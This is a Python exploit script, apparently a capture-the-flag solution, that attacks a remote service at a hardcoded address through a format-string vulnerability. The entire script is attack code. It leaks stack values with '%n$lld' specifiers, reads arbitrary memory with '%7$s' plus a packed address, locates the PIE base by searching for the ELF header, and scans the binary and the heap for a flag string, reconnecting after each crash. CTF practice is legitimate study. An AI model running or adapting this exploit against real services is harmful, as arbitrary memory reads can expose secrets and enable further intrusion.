#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.02)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    for _ in range(5):
        d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
        if m: return int(m.group(1))
        time.sleep(0.1)
    return None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    for _ in range(6):
        a15=leak_lld(s,15)
        if a15:
            start=a15&~0xfff
            for d in range(0,0x20000,0x1000):
                r=readmem(s,start-d)
                if r.startswith(b'\x7fELF'): return start-d
    return None

def scan_region(s, base_getter, start_rel, end_rel, step, label):
    # scan base_getter() + rel for rel in [start,end]; reconnect on crash, continue same rel
    found=[]
    s=s
    rel=start_rel
    while rel < end_rel:
        base = base_getter()
        if base is None:
            time.sleep(0.2); continue
        X=base+rel
        r=readmem(s,X)
        if b'PTITCTF' in r or b'2026' in r or (b'{' in r and b'}' in r):
            print("MARK",label,hex(X),repr(r[:200])); found.append((X,r))
            if b'}' in r:
                m=re.search(rb'[A-Za-z0-9_]+\{[^}]{5,}\}',r)
                if m: print("FLAG?",m.group(0)); return found, True
        if r==b'' or r==b'<T':
            try: s.close()
            except: pass
            s=newconn()
        else:
            rel += step
        if rel - start_rel > 0x20000: break
    return found, False

s=newconn()
# binary region scan
print("scanning binary data...")
found, flag = scan_region(s, lambda: get_pie(s), 0x2000, 0x8000, 0x20, "bin")
if flag: raise SystemExit
# heap scan
print("scanning heap...")
found, flag = scan_region(s, lambda: leak_lld(s,14), 0, 0x20000, 0x20, "heap")
print("done", len(found))
